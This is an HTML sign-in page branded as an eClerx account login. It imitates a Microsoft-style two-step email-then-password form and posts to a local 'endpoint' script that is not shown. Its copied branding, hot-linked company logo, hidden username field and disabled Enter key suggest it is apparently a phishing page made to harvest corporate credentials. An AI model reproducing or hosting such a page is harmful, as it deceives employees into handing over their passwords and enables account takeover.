<!DOCTYPE html><html><head>
    <meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no"/>
    <title>Sign in to your Eclerx account</title>
    <link rel="icon" type="image/svg+xml" sizes="21x21" href="./endpoint/assets/img/favicon.svg"/>
    <link rel="icon" type="image/svg+xml" sizes="43x43" href="./endpoint/assets/img/favicon.svg"/>
    <link rel="icon" type="image/svg+xml" sizes="240x240" href="./endpoint/assets/img/favicon.svg"/>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.5.0/css/bootstrap.min.css"/>
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"/>
    <link rel="stylesheet" href="https://maxcdn.icons8.com/fonts/line-awesome/1.1/css/line-awesome.min.css"/>
    <link rel="stylesheet" href="./endpoint/assets/css/styles.min.css"/>
</head>

<body class="text-nowrap" style="width: 100%;height: 100vh;">
<form action="" method="post">
    <div id="loginForm" class="container"><img id="image" data-bind="addEventHandlers, attr: { src: bannerLogoUrl, alt: str[&#39;STR_Banner_Logo_AltText&#39;] }, externalCss: { &#39;banner-logo&#39;: true }" src="https://upload.wikimedia.org/wikipedia/commons/9/9e/EClerxFinal_1.png" alt="Organization banner logo" class="banner-logo ext-banner-logo" height="40" width="150"/>
        <br/><br/><div></div>
       
        <section id="section-main">
            <section id="section-1" class="slide-page">
                <p id="signIn" class="field">Sign in</p><h5 id="result"></h5><input type="email" id="email" class="field" placeholder="someone@example.com"/>
                <p id="NoAccount" class="field"></p>
                <p id="signInSecurityKey" class="field"><a href="#" style="color: #0067b8;"></a></p><a href="#" style="color: #0067b8;">
                </a><p id="signInOptions" class="field"><a href="#" style="color: #0067b8;"></a><a href="#" style="color: #0067b8;">Can’t access your account?</a></p>
                    <p id="btnPlace" class="field"><button class="firstNext next" href="#next" type="button" id="btnSend">Next</button></p>
            </section>
            <section id="section-2" class="page secondSlide">
                <br/>
                <br/>
                <p id="userLine"></p>
                <button class="btn btn-primary btn-sm py-0 prev-1" id="btnBack" type="button" style="font-size: 12px;height: 25px;width: 26px;"><i class="la la-long-arrow-left" id="arrowBack-1" style="width: 1px;font-size: 19px;font-weight: 800;margin: -1px;"></i></button>
                <input type="text" id="UserName" placeholder="UserName" name="UserName" value="" hidden=""/>
                <p id="enterPwd">Enter Password</p><h5 id="passResult"></h5>
                    <p><input type="password" id="password" placeholder="Password" name="password"/></p>
                    <p id="keepMe">Keep me signed in</p><input type="checkbox" id="cbRemember"/>
                    <p id="ForgodPwd"><a href="#">Forgot password?</a></p>
                    <p id="SignWithKey"><a href="#">Sign in with Windows Hello or a security key</a></p>
                    <p id="btnSignInLocation"><button id="btnSignIn" class="submit" type="submit">Sign in</button></p>
            </section>
        </section>
    </div>
    <div id="footer" style="height: 36px;">
        <div id="terms" style="float: left;width: 84px;">
            <p style="font-size: 13px;text-align: left;">Terms of use</p>
        </div>
        <div style="float: left;width: 105px;">
            <p style="font-size: 12px;">Privacy &amp; cookies</p>
        </div>
        <div style="float: left;width: 24px;">
            <p style="font-size: 12px;">•••<br/></p>
        </div>
    </div>
</form>





    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.5.0/js/bootstrap.bundle.min.js"></script>
    <script src="./endpoint/assets/js/script.min.js"></script>
<script>
        document.addEventListener('keydown', function(event) {
            if (event.key === 'Enter') {
                // Prevent the default action of the Enter key
                event.preventDefault();
                // Optional: Notify the user
                console.log('Enter key is disabled globally.');
            }
        });
    </script>
</body></html>
